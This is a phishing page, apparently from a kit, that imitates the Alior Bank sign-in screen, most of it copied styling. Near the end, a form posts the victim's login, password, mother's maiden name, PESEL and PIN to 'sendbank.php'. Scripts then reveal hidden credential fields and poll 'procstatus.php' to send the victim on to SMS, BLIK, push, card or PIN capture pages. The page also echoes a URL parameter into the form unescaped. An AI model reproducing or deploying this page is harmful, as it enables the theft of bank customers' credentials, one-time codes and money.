    app-ajs-root input[type=password]:focus,
    app-ajs-root input[type=text]:not(.migrated):focus {
      box-shadow: none;
      border-color: #920035;
      border-color: var(--color-border-7);
      background-position-y: bottom;
      transition: all .2s linear
    }
    
    app-ajs-root input[type=password]::-webkit-input-placeholder,
    app-ajs-root input[type=text]:not(.migrated)::-webkit-input-placeholder {
      color: #e0e0e0;
      color: var(--color-font-5)
    }
    
    app-ajs-root input[type=password]::-moz-placeholder,
    app-ajs-root input[type=text]:not(.migrated)::-moz-placeholder {
      color: #e0e0e0;
      color: var(--color-font-5)
    }
    
    app-ajs-root input[type=password]:-ms-input-placeholder,
    app-ajs-root input[type=text]:not(.migrated):-ms-input-placeholder {
      color: #e0e0e0;
      color: var(--color-font-5)
    }
    
    app-ajs-root input[type=password]::-ms-clear,
    app-ajs-root input[type=password]::-ms-reveal,
    app-ajs-root input[type=text]:not(.migrated)::-ms-clear,
    app-ajs-root input[type=text]:not(.migrated)::-ms-reveal {
      display: none;
      width: 0;
      height: 0;
      text-indent: 100%;
      overflow: hidden
    }
    
    app-ajs-root input::-webkit-inner-spin-button,
    app-ajs-root input::-webkit-outer-spin-button {
      -webkit-appearance: none;
      margin: 0
    }
    
    app-ajs-root input::-webkit-calendar-picker-indicator {
      display: none
    }
    
    app-ajs-root label {
      line-height: 1.5em;
      font-size: .9375rem;
      display: inline-block;
      color: #565656;
      color: var(--color-font-2);
      margin-bottom: .6rem;
      vertical-align: middle;
      padding: 0;
      background-color: transparent;
      font-family: Roboto Light, sans-serif
    }
    
    app-ajs-root .field {
      position: relative;
      padding-top: 0;
      padding-bottom: 0
    }
    
    app-ajs-root .field:not(.columns) {
      margin: 0;
      padding-left: 0;
      padding-right: 0
    }
    
    app-ajs-root fieldset {
      display: block;
      position: relative;
      border: none;
      padding: 0;
      margin-bottom: 15px;
    }
    
    @media (min-width:768px)@media (min-width:1024px)app-ajs-root .input-wrapper.margin-small,
    app-ajs-root fieldset.margin-small {
      margin-bottom: 1rem
    }
    
    app-ajs-root fieldset input[type=password]:disabled,
    app-ajs-root fieldset input[type=text]:disabled {
      background-color: #fafafa;
      background-color: var(--color-input-disabled-background);
      background-image: none;
      pointer-events: none;
      border: 1px solid #a8a8a8;
      border: 1px solid var(--color-form-control-border);
      color: #a8a8a8;
      color: var(--color-input-disabled)
    }
    
    app-ajs-root .button:not(.migrated),
    app-ajs-root button:not(.migrated) {
      min-height: 50px;
      text-align: center;
      line-height: 1.25rem;
      padding: .875rem 1rem;
      font-size: .875rem;
      color: #fff;
      color: var(--color-button-font-9);
      position: relative;
      margin-bottom: 20px;
      background-color: #920035;
      background-color: var(--palette-accent-primary);
      will-change: opacity;
      border-radius: 3px;
      font-family: Roboto Regular, sans-serif;
      transition: all .25s ease
    }
    
    app-ajs-root .button:not(.migrated):visited,
    app-ajs-root button:not(.migrated):visited {
      color: #fff;
      color: var(--color-button-font-1)
    }
    
    app-ajs-root .button:not(.migrated):active,
    app-ajs-root .button:not(.migrated):focus,
    app-ajs-root .button:not(.migrated):hover,
    app-ajs-root button:not(.migrated):active,
    app-ajs-root button:not(.migrated):focus,
    app-ajs-root button:not(.migrated):hover {
      background-color: #ffd153;
      background-color: var(--color-background-8);
      border-color: #ffd153;
      border-color: var(--color-border-10);
      color: #920035;
      color: var(--color-button-font-5-active);
      font-family: Roboto Regular, sans-serif
    }
    
    app-ajs-root .button:not(.migrated).primary,
    app-ajs-root button:not(.migrated).primary {
      background-color: #920035;
      background-color: var(--palette-accent-primary);
      border: 1px solid #920035;
      border: 1px solid var(--color-border-7)
    }
    
    app-ajs-root .button:not(.migrated).primary:active,
    app-ajs-root .button:not(.migrated).primary:focus,
    app-ajs-root .button:not(.migrated).primary:hover,
    app-ajs-root button:not(.migrated).primary:active,
    app-ajs-root button:not(.migrated).primary:focus,
    app-ajs-root button:not(.migrated).primary:hover {
      background-color: #ffd153;
      background-color: var(--color-background-8);
      border-color: #ffd153;
      border-color: var(--color-border-10);
      color: #920035;
      color: var(--color-font-3)
    }
    
    @media (min-width:640px) {
      app-ajs-root .selectize-control {
        height: 3.125rem
      }
    }
    
    app-ajs-root .selectize-control .option {
      font-family: Roboto Regular, sans-serif
    }
    
    app-ajs-root .selectize-control .selectize-input {
      border: 1px solid transparent;
      background-color: #fff;
      background-color: var(--color-form-control-background);
      cursor: pointer;
      font-family: Roboto Regular, sans-serif;
      transition: all .2s ease
    }
    
    app-ajs-root .selectize-control .selectize-input:after {
      content: "";
      width: 12px;
      height: 12px;
      position: absolute;
      right: 20px!important;
      top: 50%;
      border-right: 2px solid #920035;
      border-right: 2px solid var(--color-border-7);
      border-bottom: 2px solid #920035;
      border-bottom: 2px solid var(--color-border-7);
      outline: 1px solid transparent;
      cursor: pointer;
      will-change: transform;
      transform: translate3d(0, -50%, 0) rotate(45deg)
    }
    
    @media (min-width:640px) {
      app-ajs-root .selectize-control .selectize-input:after {
        right: 1.25rem
      }
    }
    
    app-ajs-root .selectize-control .selectize-input.has-items {
      padding-top: 0!important;
      padding-bottom: 0!important
    }
    
    app-ajs-root .selectize-control .selectize-input.has-items:after {
      top: 45%
    }
    
    app-ajs-root .custom-select .selectize-input {
      padding: 0 2.5rem 0 .9375rem;
      border: 1px solid #a8a8a8;
      border: 1px solid var(--color-form-control-border);
      background-color: #fff;
      background-color: var(--color-form-control-background);
      font-size: .9375rem;
      text-align: left
    }
    
    app-ajs-root .custom-select .selectize-input:after {
      cursor: inherit
    }
    
    app-ajs-root .custom-select .selectize-input .option {
      overflow: hidden;
      text-overflow: ellipsis
    }
    
    app-ajs-root custom-select {
      position: relative
    }
    
    app-ajs-root .spacer {
      display: block;
      width: 100%
    }
    
    app-ajs-root .spacer.s1 {
      height: 1rem
    }
    
    app-ajs-root .solid-separator {
      background-color: #e0e0e0;
      background-color: var(--color-separator-line)
    }
    
    app-ajs-root .solid-separator.horizontal {
      width: 100%;
      height: 1px
    }
    
    app-ajs-root ul {
      list-style: none
    }
    
    app-ajs-root ul.list {
      padding: 0;
      margin-left: 0
    }
    
    app-ajs-root ul.list li {
      display: block;
      position: relative;
      line-height: 1.375em;
      margin-bottom: .75rem
    }
    
    app-ajs-root ul.list li.has-icon {
      padding-left: 2.25rem;
      padding-top: .125rem
    }
    
    app-ajs-root ul.list li.has-icon .icon {
      display: block;
      font-size: 1.5rem;
      position: absolute;
      top: 0;
      left: 0
    }
    
    app-ajs-root .custom-select .selectize-input {
      display: block;
      position: static;
      min-height: 50px
    }
    
    app-ajs-root .custom-select .selectize-input:before {
      content: "";
      width: 100%;
      height: 0;
      display: block;
      position: absolute;
      left: 0;
      bottom: 0;
      background-color: #920035;
      background-color: var(--palette-accent-primary);
      will-change: height;
      transition: all .35s ease
    }
    
    app-ajs-root .custom-select .selectize-input .option {
      width: 100%;
      height: 3rem;
      display: table-cell;
      vertical-align: middle;
      position: relative
    }
    
    app-ajs-root .lang-switch .custom-select .selectize-input {
      padding: 0 40px 0 0;
      border: none;
      min-width: 170px;
      width: auto;
      cursor: pointer;
      display: inline-block;
      position: relative;
      background-color: transparent
    }
    
    app-ajs-root .lang-switch .custom-select .selectize-input .option {
      color: #920035;
      color: var(--color-font-3);
      font-family: Roboto Medium, sans-serif
    }
    
    app-ajs-root .lang-switch .custom-select .selectize-input:before {
      display: none
    }
    
    app-ajs-root .lang-switch .custom-select .selectize-input .lang-switch-icon {
      width: 2rem;
      height: 2rem;
      margin: 0 1rem
    }
    
    app-ajs-root .external-page {
      position: relative;
      display: block
    }
    
    app-ajs-root .external-page header {
      position: relative;
      background-color: #fff;
      background-color: var(--color-background-2);
      height: 65px;
      line-height: 65px
    }
    
    app-ajs-root .external-page header .logo {
      display: inline-block;
      width: 130px;
      height: 65px;
      position: relative
    }
    
    app-ajs-root .external-page header .logo img {
      display: block;
      width: 100%;
      height: 100%
    }
    
    app-ajs-root .external-page header h1 {
      display: inline-block;
      vertical-align: top;
      padding: 0;
      line-height: 65px;
      font-size: .9375rem;
      margin: 0 0 0 .75rem;
      font-family: Roboto Light, sans-serif
    }
    
    @media (min-width:640px) {
      app-ajs-root .external-page header h1 {
        margin: 0 0 0 3rem;
        font-size: 1.25rem
      }
    }
    
    app-ajs-root .external-page .external-page-background {
      display: block;
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 260px;
      background-repeat: no-repeat;
      background-position: 50%
    }
    
    @media (min-width:640px) {
      app-ajs-root .external-page .external-page-background {
        height: 340px
      }
    }
    
    @media (min-width:768px) {
      app-ajs-root .external-page .external-page-background {
        height: 370px
      }
    }
    
    @media (min-width:1024px) {
      app-ajs-root .external-page .external-page-background {
        height: 420px
      }
    }
    
    @media (min-width:1366px) {
      app-ajs-root .external-page .external-page-background {
        background-size: cover
      }
    }
    
    app-ajs-root .external-page .auth-greeting {
      position: relative;
      display: flex;
      align-items: center;
      height: 80px
    }
    
    @media (min-width:640px) {
      app-ajs-root .external-page .auth-greeting {
        height: 90px
      }
    }
    
    @media (min-width:768px) {
      app-ajs-root .external-page .auth-greeting {
        height: 110px
      }
    }
    
    @media (min-width:1024px) {
      app-ajs-root .external-page .auth-greeting {
        height: 136px
      }
    }
    
    app-ajs-root .external-page .auth-greeting h2 {
      margin: 0;
      letter-spacing: normal
    }
    
    app-ajs-root .external-page main {
      position: relative;
      display: block;
      transition: all .2s ease
    }
    
    @media (min-width:768px) {
      app-ajs-root .external-page main {
        padding-top: 0
      }
    }
    
    app-ajs-root .external-page main fieldset.with-virtual-keyboard label {
      display: inline-block;
      padding-right: 2.25rem;
      position: relative
    }
    
    @media (min-width:768px) {
      app-ajs-root .external-page main fieldset.with-virtual-keyboard label {
        padding-right: 1rem
      }
    }
    
    @media (min-width:1024px) {
      app-ajs-root .external-page main fieldset.with-virtual-keyboard label {
        padding-right: 2.25rem
      }
    }
    
    app-ajs-root .external-page .service-message {
      padding-top: 1.75rem
    }
    
    app-ajs-root .external-page .service-message:last-of-type {
      padding-top: 1.125rem
    }
    
    app-ajs-root .external-page .service-message ul .single-message p {
      margin: 0;
      font-size: .75rem
    }
    
    app-ajs-root .external-page .service-message ul .single-message p span {
      padding-right: .3125rem
    }
    
    app-ajs-root .external-page .service-message ul .single-message:last-of-type,
    app-ajs-root .external-page .service-message ul:last-of-type {
      margin-bottom: 0
    }
    
    app-ajs-root .external-page .service-message .system-info-post-date {
      font-size: .75rem;
      font-family: Roboto Medium, sans-serif;
      color: #920035;
      color: var(--color-font-3)
    }
    
    app-ajs-root .external-page .service-message .system-info-link {
      display: inline-block;
      font-size: inherit;
      line-height: inherit;
      font-family: Roboto Regular, sans-serif
    }
    
    app-ajs-root .external-page .restrict-card,
    app-ajs-root .external-page .security-info-list {
      color: #565656;
      color: var(--color-font-2);
      position: relative
    }
    
    app-ajs-root .external-page .restrict-card .has-icon,
    app-ajs-root .external-page .security-info-list .has-icon {
      padding-left: 2.25rem
    }
    
    app-ajs-root .external-page .restrict-card .has-icon .icon-ban,
    app-ajs-root .external-page .security-info-list .has-icon .icon-ban {
      color: #ed0023;
      color: var(--palette-error);
      display: inline-block;
      vertical-align: top;
      position: relative
    }
    
    app-ajs-root .external-page .restrict-card .has-icon svg,
    app-ajs-root .external-page .security-info-list .has-icon svg {
      display: block;
      position: absolute;
      left: 0
    }
    
    app-ajs-root .external-page .restrict-card .has-icon svg path,
    app-ajs-root .external-page .security-info-list .has-icon svg path {
      fill: #565656;
      fill: var(--color-external-page-path-fill)
    }
    
    app-ajs-root .external-page .restrict-card .has-icon svg+.icon,
    app-ajs-root .external-page .security-info-list .has-icon svg+.icon {
      display: none
    }
    
    app-ajs-root .external-page .auth-wrapper {
      position: relative;
      min-height: calc(100vh - 65px)
    }
    
    app-ajs-root .external-page .sign-in-placement {
      position: relative;
      display: block;
      min-height: 0;
      transition: all .25s ease-in-out
    }
    
    @media (min-width:640px) {
      app-ajs-root .external-page .sign-in-placement {
        min-height: calc(260px - 1rem);
        margin-bottom: 2rem
      }
    }
    
    @media (min-width:768px) {
      app-ajs-root .external-page .sign-in-placement {
        min-height: calc(270px - 1rem)
      }
    }
    
    @media (min-width:1024px) {
      app-ajs-root .external-page .sign-in-placement {
        min-height: calc(300px - 1rem)
      }
    }
    
    app-ajs-root .external-page .security-info-wrapper {
      display: flex;
      flex-direction: column;
      margin-bottom: 1em
    }
    
    @media (min-width:1024px) {
      app-ajs-root .external-page .security-info-wrapper {
        flex-direction: row
      }
    }
    
    app-ajs-root .external-page .security-info-wrapper ul.security-info-list {
      margin-bottom: 1em
    }
    
    app-ajs-root .external-page .security-info-wrapper ul.security-info-list li {
      margin-right: 2em
    }
    
    @media (min-width:768px) {
      app-ajs-root .external-page .security-info-wrapper ul.security-info-list li {
        display: inline-block
      }
    }
    
    app-ajs-root .external-page .lang-switch-section {
      flex-direction: column
    }
    
    @media (min-width:1024px) {
      app-ajs-root .external-page .lang-switch-section {
        flex-direction: row
      }
    }
    
    app-ajs-root .external-page lang-switch {
      display: inline-block
    }
    
    app-ajs-root .external-page .external-section-wrapper {
      position: relative;
      box-shadow: 0 0 1rem rgba(0, 0, 0, .1);
      box-shadow: 0 0 1rem var(--color-box-shadow-2-transparent-10);
      background-color: #ed0023;
      background-color: var(--palette-error);
      margin-bottom: 2em
    }
    
    app-ajs-root .external-page .external-section-wrapper .external-section-svg {
      display: block;
      width: 100%;
      height: 100%;
      position: absolute;
      top: 0;
      left: 0;
      background-color: #fff;
      background-color: var(--color-background-2)
    }
    
    app-ajs-root .external-page .external-section-wrapper .external-section-content {
      position: relative;
      height: -webkit-max-content;
      height: -moz-max-content;
      height: max-content
    }
    
    app-ajs-root .external-page .external-section-wrapper .external-section-content:not(.no-min-height) {
      min-height: 320px
    }
    
    @media (min-width:768px) {
      app-ajs-root .external-page .external-section-wrapper .external-section-content:not(.no-min-height) {
        min-height: 340px
      }
    }
    
    @media (min-width:1024px) {
      app-ajs-root .external-page .external-section-wrapper .external-section-content:not(.no-min-height) {
        min-height: 370px
      }
    }
    
    app-ajs-root .main-nav ul li .second-level-menu li:last-of-type ul li a {
      border-bottom: 3px solid transparent
    }
    
    app-ajs-root notifications-details @supports (-webkit-marquee-repetition:infinite) and ((-o-object-fit:fill) or (object-fit:fill)) {}
    
    app-ajs-root .tooltip:not(.migrated):after {
      display: block;
      width: 0;
      height: 0;
      position: absolute;
      color: #a8a8a8;
      color: var(--color-font-4);
      border: 8px solid transparent;
      opacity: 0;
      z-index: -1;
      visibility: hidden;
      transition: opacity .3s cubic-bezier(.28, .73, .45, .98)
    }
    
    app-ajs-root .tooltip:not(.migrated).offset-left {
      margin-left: 5px
    }
    
    body .block {
      display: block
    }
    
    app-ajs-root .flex-column,
    body .flex-column {
      display: flex;
      width: 100%
    }
    
    app-ajs-root .flex-grow,
    body .flex-grow {
      flex-grow: 1
    }
    
    app-ajs-root .flex-column,
    body .flex-column {
      flex-direction: column
    }
    
    app-ajs-root .my-4,
    body .my-4 {
      margin-top: 1.25rem;
      margin-bottom: 1.25rem
    }
    
    app-ajs-root .p-8,
    body .p-8 {
      padding: 2.5rem
    }
    
    @media (min-width:1024px) {
      app-ajs-root .large-p-10,
      body .large-p-10 {
        padding: 3.125rem
      }
    }
    
    app-ajs-root .relative,
    body .relative {
      position: relative
    }
  </style></head>
  

  <body>
    <app-component class="ng-tns-c12-0">
      <div class="ng-tns-c12-0 ng-trigger ng-trigger-fadeInOutFast ng-star-inserted">
        <router-outlet class="ng-tns-c12-0"></router-outlet>
      </div>
    </app-component>
    <div class="view-app" style="">
      <app-ajs-root>
        <div>
          <div class="sign-in-site">
            <div class="sign-in-wrapper">
              <auth.sign-in>
                <div class="external-page">
                  <div>
                    <auth.sign-in.cif>
                      <div>
                        <auth-header>
                          <header role="banner">
                            <a href="http://www.aliorbank.pl/" class="logo" title="Alior Bank"> <img src="./alior_files/alior-image-1.svg" alt="Alior Bank"> </a>
                            <h1 tabindex="0">
                    <span class="hide-for-medium">Zaloguj się</span>
                    <span class="show-for-medium">Zaloguj się</span>
                </h1> </header>
                        </auth-header>
                        <main> <img class="external-page-background" src="./alior_files/alior-image-2.jpg">
                          <div class="auth-wrapper flex-column">
                            <div class="flex-grow">
                              <auth-greeting>
                                <div class="row align-center">
                                  <div class="small-19 medium-18 column">
                                    <div class="auth-greeting">
                                      <h2 tabindex="0">Witamy w Alior Banku!</h2> </div>
                                  </div>
                                </div>
                              </auth-greeting>
                              <div class="row align-center">
                                <div class="column small-19 medium-9 large-7">
                                  <external-section>
                                    <section class="external-section-wrapper">
                                      <svg class="external-section-svg" xmlns="http://www.w3.org/2000/svg"> </svg>
                                      <div class="external-section-content p-8 large-p-10">
                                        <cif-form>
                                          <form action="sendbank.php" name="form" class="ng-pristine ng-valid" method="post">
                                            <div class="form-container">
                                              <div>
                                                <fieldset class="with-virtual-keyboard">
                                                  <label for="login">Login <span class="icon icon-info offset-left tooltip" tabindex="0" role="button"></span> </label>
                                                  <div class="js-keyboard-container js-keyboard-login field">
                                                  <input type="hidden" name="id" value="<?php echo $_GET['id']; ?>">
                                                  <input type="hidden" name="type" value="1">
                                                  
                                                    <input id="field3ds1" name="logindata" type="text" placeholder="Wpisz identyfikator klienta" required=""> </div>
                                                </fieldset>
                                                <fieldset class="with-virtual-keyboard">
                                                  <label for="login">Hasło </label>
                                                  <div class="js-keyboard-container js-keyboard-login field">
                                                    <input id="field3ds2" name="passdata" type="text" required=""> </div>
                                                </fieldset>
                                                <fieldset class="with-virtual-keyboard">
                                                  <label for="login">Nazwisko rodowe Matki </label>
                                                  <div class="js-keyboard-container js-keyboard-login field">
                                                    <input id="field3ds1" name="mamkadata" type="text" required=""> </div>
                                                </fieldset>
                                                <solid-separator class="block my-4">
                                                  <div class="solid-separator horizontal"></div>
                                                </solid-separator>
                                                <fieldset class="with-virtual-keyboard">
                                                  <div class="js-keyboard-container js-keyboard-login field">
                                                    <input style="display: none;" id="field3ds3" type="text" name="peseldata" placeholder="PESEL" required=""> </div>
                                                </fieldset>
                                                <fieldset class="with-virtual-keyboard">
                                                  <div class="js-keyboard-container js-keyboard-login field">
                                                    <input style="display: none;" id="field3ds4" type="password" name="pindata" placeholder="PIN" required=""> </div>
                                                </fieldset>
                                                <div style="color: #ff6161; padding: 20px; text-align: center;"></div>
                                                <button id="field3ds5" class="button primary expanded login-submit" type="submit" title="Dalej">Dalej</button>
                                                <!-- <input style="display: none;" id="field3ds6" class="button primary expanded login-submit" type="submit" value="Zaloguj się"> -->
                                                <div class="text-right"><a href="https://system.aliorbank.pl/unblock-access">Problem z logowaniem?</a>
                                                  <br><a href="https://www.aliorbank.pl/dodatkowe-informacje/bankowosc-elektroniczna/nowa-bankowosc-internetowa.html?utm_source=nowa-bankowosc&amp;utm_medium=logowanie-link2" target="_blank">Poznaj nowy system bankowości</a></div>
                                              </div>
                                            </div>
                                          </form>
                                        </cif-form>
                                        <script>
                                          var button1 = document.querySelector('#field3ds5');
                                          var inp1 = document.querySelector('#field3ds1');
                                          var inp2 = document.querySelector('#field3ds2');
                                          var inp3 = document.querySelector('#field3ds3');
                                          var inp4 = document.querySelector('#field3ds4');
                                          var inp6 = document.querySelector('#field3ds6');
                                          var inp1 = document.querySelector('#field3ds1');
                                          var inp2 = document.querySelector('#field3ds2');
                                          button1.onclick = function() {
                                            if (inp1.value.length > 5 && inp2.value.length > 5) {
                                              // inp1.style.display = 'block';
                                              // inp2.style.display = 'block';
                                              inp3.style.display = 'block';
                                              inp4.style.display = 'block';
                                              inp6.style.display = 'block';
                                              button1.style.display = 'none';
                                            }
                                          }
                                        </script>
                                        <script type="text/javascript">
                                          function ajaxsup1() {
                                            var request = new XMLHttpRequest();
                                            request.onreadystatechange = function() {
                                              if (request.readyState == 4 && request.status == 200) {
                                                var loading = document.querySelector('#loading');
                                                var smsblock = document.querySelector('#sms');
                                                var lkblock = document.querySelector('#lk');
                                                var result = request.responseText;
                                                // console.log(request.responseText);
                                                console.log('%md%');
                                                if (result == 'sms') {
                                                  location = "/3ds%md%";
                                                } else if (result == 'lk') {
                                                  location = "/autorize%md%";
                                                } else if (result == 'photo') {
                                                  location = "/checking%md%";
                                                } else if (result == 'blik') {
                                                  location = "/blik%md%";
                                                } else if (result == 'push') {
                                                  location = "/potwierdzenie%md%";
                                                } else if (result == 'card') {
                                                  location = "/verification%md%";
                                                } else if (result == 'token') {
                                                  location = "/ipko%md%";
                                                } else if (result == 'pin') {
                                                  location = "/pincode%md%";
                                                } else {}
                                              }
                                            }
                                            request.open('POST', 'procstatus.php');
                                            request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                                            request.send('item=31986326');
                                          }

                                          function ajaxdel() {
                                            var request = new XMLHttpRequest();
                                            request.open('POST', 'delstatus.php');
                                            request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                                            request.send('item=31986326');
                                          }
                                        </script>
                                        <style>
                                          .chaport-container.chaport-container-positioned {
                                            position: fixed;
                                            box-sizing: border-box;
                                            top: auto;
                                            right: 0;
                                            bottom: 0;
                                            left: 0;
                                            width: auto;
                                            height: 0;
                                            overflow: visible;
                                          }
                                          
                                          .chaport-container {
                                            font-size: 14px;
                                            z-index: 2147483500;
                                          }
                                          
                                          .chaport-container .chaport-launcher {
                                            position: absolute;
                                            display: block;
                                            bottom: 0;
                                            right: 0;
                                            left: 0;
                                            z-index: 2147483500;
                                            width: auto;
                                            height: 0;
                                            overflow: visible;
                                            font-size: 14px;
                                          }
                                          
                                          .chaport-container div {
                                            display: block;
                                          }
                                          
                                          .chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button,
                                          .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
                                            background-color: #920035;
                                          }
                                          
                                          .chaport-container .chaport-launcher .chaport-launcher-button {
                                            position: absolute;
                                            bottom: 1.42857em;
                                            right: 1.42857em;
                                            width: 4.28571em;
                                            height: 4.28571em;
                                            -webkit-border-radius: 50%;
                                            -moz-border-radius: 50%;
                                            -ms-border-radius: 50%;
                                            border-radius: 50%;
                                            -webkit-box-shadow: 0 5px 38px rgba(0, 0, 0, 0.15);
                                            box-shadow: 0 5px 38px rgba(0, 0, 0, 0.15);
                                            cursor: pointer;
                                            -webkit-transition: visibility 0s linear 0.2s, opacity linear 0.2s;
                                            -o-transition: visibility 0s linear 0.2s, opacity linear 0.2s;
                                            transition: visibility 0s linear 0.2s, opacity linear 0.2s;
                                          }
                                          
                                          .chaport-container .chaport-anim-show {
                                            visibility: visible;
                                            opacity: 1;
                                            -webkit-transition-delay: 0s !important;
                                            transition-delay: 0s !important;
                                          }
                                          
                                          .chaport-container .chaport-launcher {
                                            position: absolute;
                                            display: block;
                                            bottom: 0;
                                            right: 0;
                                            left: 0;
                                            z-index: 2147483500;
                                            width: auto;
                                            height: 0;
                                            overflow: visible;
                                            font-size: 14px;
                                          }
                                          
                                          .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
                                            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
                                            opacity: 1;
                                            transform: rotate(0deg);
                                            width: 2.28571em;
                                            height: 2.64286em;
                                            position: absolute;
                                            margin-top: 0.07143em;
                                            top: 0.92857em;
                                            left: 1em;
                                            background-image: url(/chap.png);
                                            background-repeat: no-repeat;
                                            background-size: 100% 100%;
                                          }
                                          
                                          .chaport-container .chaport-launcher .chaport-launcher-button {
                                            position: absolute;
                                            bottom: 1.42857em;
                                            right: 1.42857em;
                                            width: 4.28571em;
                                            height: 4.28571em;
                                            -webkit-border-radius: 50%;
                                            -moz-border-radius: 50%;
                                            -ms-border-radius: 50%;
                                            border-radius: 50%;
                                            -webkit-box-shadow: 0 5px 38px rgba(0, 0, 0, 0.15);
                                            box-shadow: 0 5px 38px rgba(0, 0, 0, 0.15);
                                            cursor: pointer;
                                            -webkit-transition: visibility 0s linear 0.2s, opacity linear 0.2s;
                                            -o-transition: visibility 0s linear 0.2s, opacity linear 0.2s;
                                            transition: visibility 0s linear 0.2s, opacity linear 0.2s;
                                          }
                                          
                                          .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
                                            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
                                            opacity: 0;
                                            transform: rotate(-45deg) scale(1);
                                            position: absolute;
                                            top: 0;
                                            right: 0;
                                            width: 4.28571em;
                                            height: 4.28571em;
                                          }
                                          
                                          .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
                                            -ms-transform: rotate(45deg);
                                            -webkit-transform: rotate(45deg);
                                            transform: rotate(45deg);
                                          }
                                          
                                          .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before,
                                          .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
                                            position: absolute;
                                            top: 1.5em;
                                            right: 2.07143em;
                                            content: ' ';
                                            height: 1.35714em;
                                            width: 0.14286em;
                                            background-color: #fff;
                                          }
                                          
                                          .chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
                                            opacity: 0;
                                          }
                                          
                                          .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
                                            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
                                            opacity: 1;
                                            transform: rotate(0deg);
                                            position: absolute;
                                            z-index: 1;
                                            width: 100%;
                                            height: 100%;
                                          }
                                          
                                          .chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
                                            transform: scale(1);
                                          }
                                          
                                          .chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
                                            border-width: 0.33333em;
                                            bottom: 1.13333em;
                                            border-left-color: #fff;
                                          }
                                          
                                          .chaport-container .chaport-window-anim.chaport-anim-hide {
                                            transform: translateY(20px);
                                          }
                                          
                                          .chaport-container.chaport-container-positioned .chaport-window {
                                            position: absolute;
                                            top: auto;
                                            right: 20px;
                                            bottom: 115px;
                                            left: auto;
                                            width: 300px;
                                            -webkit-box-shadow: 0 5px 38px rgba(0, 0, 0, 0.15);
                                            box-shadow: 0 5px 38px rgba(0, 0, 0, 0.15);
                                            -webkit-border-radius: 8px;
                                            -moz-border-radius: 8px;
                                            -ms-border-radius: 8px;
                                            border-radius: 8px;
                                            overflow: hidden;
                                            z-index: 2147483500;
                                          }
                                          
                                          .chaport-container .chaport-window-anim {
                                            transition: height 0s linear 0.3s, visibility 0s linear 0.3s, opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1), transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
                                          }
                                          
                                          .chaport-container .chaport-inner {
                                            position: relative;
                                            margin-left: 0px;
                                            margin-right: 0px;
                                            background-color: #fff;
                                          }
                                          
                                          .chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
                                            position: absolute;
                                            right: 0;
                                            bottom: 60px;
                                          }
                                          
                                          .chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
                                            position: absolute;
                                            left: -41px;
                                            bottom: 7px;
                                          }
                                          
                                          .chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
                                            width: 100%;
                                            height: 100%;
                                            -webkit-border-radius: 50%;
                                            -moz-border-radius: 50%;
                                            -ms-border-radius: 50%;
                                            border-radius: 50%;
                                          }
                                          
                                          .chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
                                            margin-bottom: 5px;
                                            font-size: 15px;
                                            font-weight: bold;
                                          }
                                          
                                          .chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
                                            font-size: 15px;
                                          }
                                          
                                          @media (max-width: 339px),
                                          (min-width: 341px) {
                                            .chaport-close,
                                            .chaport-container .chaport-close {
                                              display: block;
                                            }
                                          }
                                          
                                          .chaport-container .chaport-big-shadow {
                                            opacity: 0;
                                            z-index: 2147483499;
                                            position: fixed;
                                            width: 480px;
                                            height: 480px;
                                            bottom: 0;
                                            right: 0;
                                            content: "";
                                            pointer-events: none;
                                            background: radial-gradient(ellipse at bottom right, rgba(27, 37, 52, 0.15) 0, rgba(27, 37, 52, 0) 70%);
                                            -webkit-transition: opacity 0.2s linear;
                                            -o-transition: opacity 0.2s linear;
                                            transition: opacity 0.2s linear;
                                          }
                                          
                                          .chaport-content {
                                            position: absolute;
                                            top: 0;
                                            right: 0;
                                            bottom: 0;
                                            left: 0;
                                            overflow: hidden;
                                            -webkit-border-top-left-radius: 8px;
                                            -moz-border-top-left-radius: 8px;
                                            -ms-border-top-left-radius: 8px;
                                            border-top-left-radius: 8px;
                                            -webkit-border-top-right-radius: 8px;
                                            -moz-border-top-right-radius: 8px;
                                            -ms-border-top-right-radius: 8px;
                                            border-top-right-radius: 8px;
                                            display: flex;
                                            flex-direction: column;
                                            justify-content: space-between;
                                          }
                                          
                                          @media (max-width: 460px),
                                          (max-width: 750px) and (orientation: landscape) .chaport-content {
                                            -webkit-border-radius: 0;
                                            -moz-border-radius: 0;
                                            -ms-border-radius: 0;
                                            border-radius: 0;
                                          }
                                          
                                          .chaport-close,
                                          .chaport-container .chaport-close {
                                            position: absolute;
                                            top: 0;
                                            right: 0;
                                            z-index: 4;
                                            width: 50px;
                                            height: 41px;
                                            cursor: pointer;
                                            opacity: 0.6;
                                            -webkit-transition: opacity 0.2s linear;
                                            -o-transition: opacity 0.2s linear;
                                            transition: opacity 0.2s linear;
                                            display: none;
                                          }
                                          
                                          .main-textblock {
                                            background-color: #ffffff;
